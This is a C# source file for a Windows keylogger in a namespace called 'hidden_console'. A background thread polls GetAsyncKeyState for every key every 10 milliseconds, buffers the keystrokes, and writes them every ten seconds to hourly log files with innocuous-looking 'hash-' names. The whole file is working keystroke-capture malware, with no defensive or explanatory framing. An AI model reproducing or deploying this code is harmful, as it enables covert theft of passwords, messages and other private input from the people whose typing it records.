using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace hidden_console
{
    public static class KeyHook
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);
        private static DateTime _ticks = DateTime.Now;
        private static Thread _pollingThread;
        private static string _buffer = string.Empty;
        private static string _executablePath = System.Reflection.Assembly.GetEntryAssembly().Location.Replace(AppDomain.CurrentDomain.FriendlyName, "");
        //private static string _projectDirectory = $@"{Directory.GetCurrentDirectory()}\..\..\";
        private static volatile Dictionary<Keys, bool> _keysStates = new Dictionary<Keys, bool>();
        private static Dictionary<Keys, string> _commonKeysConverter = new Dictionary<Keys, string>
        {
            { Keys.Space, " " },
            { Keys.Enter, "[Enter]" },
            { Keys.ShiftKey, "[ShiftKey]" },
            { Keys.Menu, "[AltKey]" },
            { Keys.ControlKey, "[ControlKey]" },
            { Keys.LWin, "[LWindows]" },
            { Keys.RWin, "[RWindows]" },
        };


        private static bool _IS_WRITABLE_(Keys key)
        {
            return (key >= Keys.A && key <= Keys.RWin) || (key >= Keys.Enter && key <= Keys.Menu) || key == Keys.Space;
        }

        public static event KeyEventDelegate OnKeyDown;
        public static event KeyEventDelegate OnKeyUp;
        public delegate void KeyEventDelegate(Keys key);

        internal static void Initialize()
        {
            if (_pollingThread != null && _pollingThread.IsAlive)
                return;
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                _keysStates[key] = false;
            _pollingThread = new Thread(PollKeys)
            {
                IsBackground = true,
                Name = "KeyThread"
            };
            _pollingThread.Start();
        }

        private static void PollKeys()
        {
            for (;;)
            {
                Thread.Sleep(10);
                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                {
                    if (((GetAsyncKeyState(key) & (1 << 15)) != 0))
                    {
                        if (_keysStates[key])
                            continue;
                        if (_IS_WRITABLE_(key))
                        {
                            OnKeyDown?.Invoke(key);
                            _buffer += _commonKeysConverter.ContainsKey(key) ? _commonKeysConverter[key] : key.ToString();
                        }
                        _keysStates[key] = true;
                    }
                    else
                    {
                        if (!_keysStates[key])
                            continue;
                        OnKeyUp?.Invoke(key);
                        _keysStates[key] = false;
                    }
                }

                if ((DateTime.Now - _ticks).TotalSeconds > 10)
                {
                    if (string.IsNullOrEmpty(_buffer))
                        continue;
                    var now = DateTime.Now;
                    var filePath = $"hash-{now.Year}-{now.Month.ToString().PadLeft(2, '0')}-{now.Day.ToString().PadLeft(2, '0')}-{now.Hour.ToString().PadLeft(2, '0')}.txt";
                    _buffer = File.Exists(filePath)
                        ? $"{File.ReadAllText(filePath, Encoding.UTF8)}\r\n{DateTime.Now.ToString()}\r\n{_buffer}"
                        : $"{DateTime.Now.ToString()}\r\n{_buffer}";
                    File.WriteAllText(filePath, _buffer);
                    _buffer = string.Empty;
                    _ticks = DateTime.Now;
                }
            }
        }
    }
}
